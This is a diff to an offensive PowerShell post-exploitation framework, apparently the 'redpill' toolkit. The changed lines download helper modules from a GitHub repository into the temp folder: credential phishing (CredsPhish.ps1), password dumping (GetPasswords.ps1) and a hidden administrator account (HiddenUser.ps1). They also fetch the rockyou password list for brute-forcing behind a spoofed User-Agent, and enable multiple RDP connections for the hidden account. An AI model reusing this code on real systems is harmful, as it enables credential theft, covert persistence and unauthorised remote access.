@@ -268,7 +268,7 @@ If($GetConnections -ieq "Enum" -or $GetConnections -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1 -Destination $Env:TMP\GetConnections.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetConnections.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,4599609375/KB
+      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,36328125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetConnections.ps1"){Remove-Item -Path "$Env:TMP\GetConnections.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1129,7 +1129,7 @@ If($PhishCreds -ieq "Start" -or $PhishCreds -ieq "Brute"){
 
    ## Check for file download integrity (fail/corrupted downloads)
    $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 17,05078125/KB
+   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 17,19921875/KB
    If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 17 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
       ## Fail to download CredsPhish.ps1 using BitsTransfer OR the downloaded file is corrupted
       Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
@@ -1193,7 +1193,7 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetPasswords.ps1 -Destination $Env:TMP\GetPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetPasswords.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 11){## Corrupted download detected => DefaultFileSize: 11,8134765625/KB
+      If($SizeDump -lt 11){## Corrupted download detected => DefaultFileSize: 11,8876953125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetPasswords.ps1"){Remove-Item -Path "$Env:TMP\GetPasswords.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1443,11 +1443,11 @@ If($BruteZip -ne "false"){
       Start-Sleep -Seconds 1
    }
 
-   ## Download passwords.txt from my github repository
+   ## Download passwords.txt from my github repository using a fake User-Agent
    If(-not(Test-Path -Path "$PassList")){## Check if password list exists
       $PassFile = $PassList.Split('\\')[-1]
       Write-Host "[+] Downloading $PassFile (iwr)"
-      iwr -uri https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt -OutFile $PassList
+      iwr -uri https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt -OutFile $PassList -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       #Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/passwords.txt -Destination $PassList -ErrorAction SilentlyContinue|Out-Null
    }Else{## User Input dicionary
       $PassFile = $PassList.Split('\\')[-1]
@@ -2241,7 +2241,7 @@ If($HiddenUser -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1 -Destination $Env:TMP\HiddenUser.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\HiddenUser.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 12){## Corrupted download detected => DefaultFileSize: 12,9658203125/KB
+      If($SizeDump -lt 13){## Corrupted download detected => DefaultFileSize: 13,6630859375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\HiddenUser.ps1"){Remove-Item -Path "$Env:TMP\HiddenUser.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3640,7 +3640,8 @@ $HelpParameters = @"
    .NOTES
       Required Dependencies: Administrator Privileges on shell
       Mandatory requirements to {Create|Delete} or set account {Visible|Hidden} state
-      The new created user account will have 'administrators' privileges rigths set.
+      The new created user account will be added to 'administrators' Group Name. And
+      desktop will allow multiple RDP connections { AllowTSConnections }
 
    .Parameter HiddenUser
       Accepts arguments: Query, Create, Delete, Visible, Hidden
